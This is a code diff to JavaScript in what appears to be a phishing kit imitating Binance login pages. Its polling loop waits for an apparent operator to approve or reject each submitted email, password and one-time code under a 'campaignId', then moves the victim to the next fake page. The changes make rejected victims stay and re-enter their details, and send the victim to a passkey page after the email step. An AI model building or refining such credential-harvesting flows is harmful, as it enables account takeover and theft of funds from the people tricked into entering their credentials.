@@ -601,7 +601,10 @@
             console.log('Campaign ID:', campaignId);
             console.log('Step:', step);
             
+            let pollingActive = true; // Flag to control polling
+            
             const poll = () => {
+                if (!pollingActive) return; // Stop polling if disabled
                 console.log('Polling...');
                 fetch(pollUrl, {
                     method: 'GET',
@@ -619,6 +622,7 @@
                     
                     if (result.submission_status === 'approved') {
                         console.log('Status approved! Redirecting...');
+                        pollingActive = false; // Stop polling
                         // Hide loading and proceed to next step IMMEDIATELY
                         hideLoading();
                         setDataExpiration();
@@ -633,14 +637,16 @@
                             window.location.href = 'binance.html';
                         }
                     } else if (result.submission_status === 'rejected') {
-                        console.log('Status rejected! Showing error...');
-                        // Hide loading and show error
+                        console.log('Status rejected! Showing error and stopping...');
+                        pollingActive = false; // Stop polling - DO NOT PROCEED
+                        // Hide loading and show error - STAY ON CURRENT PAGE
                         hideLoading();
                         let errorMsg = 'Incorrect input. Please try again.';
                         if (step === 'email') errorMsg = result.error_message || 'Incorrect email. Please try again.';
                         else if (step === 'password') errorMsg = result.error_message || 'Incorrect password. Please try again.';
                         else if (step === 'otp') errorMsg = result.error_message || 'Invalid OTP. Please try again.';
                         showError(errorMsg);
+                        // DO NOT REDIRECT - User must fix the input and try again
                     } else {
                         console.log('Status still pending. Current status:', result.submission_status);
                         // Still pending, continue polling
@@ -650,26 +656,31 @@
                 .catch(error => {
                     console.error('Polling error:', error);
                     // Continue polling on error, but limit retries
-                    setTimeout(poll, 3000);
+                    if (pollingActive) {
+                        setTimeout(poll, 3000);
+                    }
                 });
             };
             
             // Start polling
             poll();
             
-            // Add a fallback timeout after 30 seconds in case polling gets stuck
+            // Add a fallback timeout after 30 seconds - but only proceed if NOT rejected
             setTimeout(() => {
-                console.log('Polling timeout reached, proceeding anyway...');
-                hideLoading();
-                setDataExpiration();
-                if (step === 'email') {
-                    window.location.href = 'binance-password.html';
-                } else if (step === 'password') {
-                    window.location.href = 'binance-otp.html';
-                } else if (step === 'otp') {
-                    window.location.href = 'binance-verification.html';
-                } else {
-                    window.location.href = 'binance.html';
+                if (pollingActive) { // Only proceed if polling is still active (not rejected)
+                    console.log('Polling timeout reached, proceeding anyway...');
+                    pollingActive = false;
+                    hideLoading();
+                    setDataExpiration();
+                    if (step === 'email') {
+                        window.location.href = 'binance-passkey.html';
+                    } else if (step === 'password') {
+                        window.location.href = 'binance-otp.html';
+                    } else if (step === 'otp') {
+                        window.location.href = 'binance-verification.html';
+                    } else {
+                        window.location.href = 'binance.html';
+                    }
                 }
             }, 30000); // 30 second timeout
         }
